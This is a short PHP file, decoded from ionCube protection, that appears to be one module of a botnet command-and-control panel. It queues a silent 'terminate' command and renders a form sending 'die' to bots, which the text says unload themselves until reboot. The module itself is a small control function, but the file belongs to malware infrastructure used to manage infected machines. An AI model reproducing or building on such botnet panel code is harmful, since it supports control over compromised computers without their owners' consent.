<?php
/*
 * @ https://EasyToYou.eu - IonCube v10 Decoder Online
 * @ PHP 5.6
 * @ Decoder version: 1.0.4
 * @ Release: 02/06/2020
 *
 * @ ZendGuard Decoder PHP 5.6
 */

echo "\t\t\t\t";
if (!isset($_TASK_FILE_UI_ONLY)) {
    $e_cmd_switches = COMMAND_GENERAL_SWITCH_SILENT;
    $_TASK_FILE_SQL_TASK_TYPE = TASK_TYPE_TERMINATE;
    $_TASK_COMMAND_STRING = sprintf(COMMAND_FORMAT_TERMINATE, COMMAND_STRING_TERMINATE, $e_cmd_switches);
} else {
    echo "\t\t\t\t\n\t\t\t\t";
    _obfuscated_0D3C1605063C03152930040422062C0F0121150D5C0832_("Terminate Bot Command options", 17, "top: 0px; font-size: 10px; face: font-family: Tahoma;", "left: 2px");
    echo "\t\t\t\t<br />\n\t\t\t\t<input type=\"hidden\" name=\"cmd_command\" value=\"die\">\n\t\t\t\t<span style=\"position: relative; top: -5px; font-size: 11px; face: font-family: Tahoma\"><i>No extended options<br />Bot will unload itself until next reboot only</i></span>\n\t\t\t\t<br />\n\t\t\t\t";
}

?>